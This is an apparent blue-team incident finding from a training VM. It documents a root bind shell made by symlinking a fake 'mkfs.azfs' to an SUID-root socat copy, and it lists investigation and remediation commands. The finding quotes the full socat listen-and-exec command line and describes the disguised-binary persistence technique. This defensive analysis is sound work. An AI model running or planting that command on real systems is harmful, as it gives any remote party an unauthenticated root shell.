# F003 — mkfs.azfs Bind Shell on Port 45926

**Discovered:** 2026-11-13 ~20:55 UTC
**VM:** opensuse-task (10.0.172.145)
**Severity:** CRITICAL
**Status:** INVESTIGATE

## What It Is
`/usr/bin/mkfs.azfs` is a symlink → `/usr/bin/socat1` (SUID root)
Running as: `mkfs.azfs TCP-LISTEN:45926,fork EXEC:/bin/bash`
Anyone connecting to port 45926 gets a root shell.

## Evidence
```
PID 206074, PPID 1, Uid: 1004 0 0 0 (ruid=blueteam, euid=root via SUID)
LISTEN 0.0.0.0:45926
/usr/bin/mkfs.azfs → socat1 (SUID root)
```

## Mystery
Process ruid is 1004 (blueteam=me) but I don't remember running it.
Investigation found NO trigger in: .bashrc, .profile, /etc/bash.bashrc, /etc/profile, /etc/profile.d/, /etc/pam.d/
PPID is 1 (init/systemd) — so systemd started it, which means there's a systemd service/timer we haven't found. The ruid=1004 may come from historical process context or a service running `su - blueteam`.

**TODO:** Search systemd for anything that references mkfs.azfs, socat, or runs as blueteam:
```
sudo systemctl list-units --all | grep -iE 'mkfs|socat|azfs|blueteam'
sudo grep -rE 'mkfs|socat|azfs' /etc/systemd/ /usr/lib/systemd/ 2>/dev/null
```

## Remediation Plan
1. Find and disable launcher (systemd unit, likely)
2. Kill process: `sudo kill -9 206074`
3. Verify port closed: `sudo ss -tlnp | grep 45926`
4. Remove symlink: `sudo rm /usr/bin/mkfs.azfs`
5. Remove or neutralize SUID on socat1: `sudo chmod u-s /usr/bin/socat1` (or rm)
6. Check for other socat* binaries with SUID: `find / -name 'socat*' -perm -4000`

## Remediation Actions Taken
- [ ] Not yet started
